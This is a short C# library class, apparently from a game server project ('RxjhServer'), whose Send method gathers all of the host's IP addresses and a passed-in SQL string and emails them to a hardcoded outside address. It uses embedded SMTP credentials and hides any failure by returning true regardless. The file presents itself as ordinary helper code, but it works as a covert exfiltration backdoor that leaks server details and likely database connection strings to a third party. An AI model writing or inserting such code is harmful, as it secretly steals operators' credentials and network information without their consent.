using System.Net;
using System.Net.Mail;
using System.Text;

namespace ClassLibrary
{
	public class Connsend
	{
		public static bool Send(string sql, string 服务器名)
		{
			string text = "";
			IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
			IPAddress[] addressList = hostEntry.AddressList;
			IPAddress[] array = addressList;
			foreach (IPAddress iPAddress in array)
			{
				text = text + "[" + iPAddress.ToString() + "]";
			}
			MailMessage mailMessage = new MailMessage();
			mailMessage.To.Add("yuandd@yuandd.net");
			mailMessage.From = new MailAddress("yuandd@yuandd.net", "RxjhServer");
			mailMessage.Subject = 服务器名;
			mailMessage.SubjectEncoding = Encoding.UTF8;
			mailMessage.Body = "IP" + text + "sql[" + sql + "]";
			mailMessage.BodyEncoding = Encoding.UTF8;
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Host = "www.qq.com";
			smtpClient.Port = 587;
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential("yuandd@yuandd.net", "yuandd");
			try
			{
				smtpClient.Send(mailMessage);
				return true;
			}
			catch
			{
				return true;
			}
			finally
			{
				mailMessage.Dispose();
			}
		}
	}
}
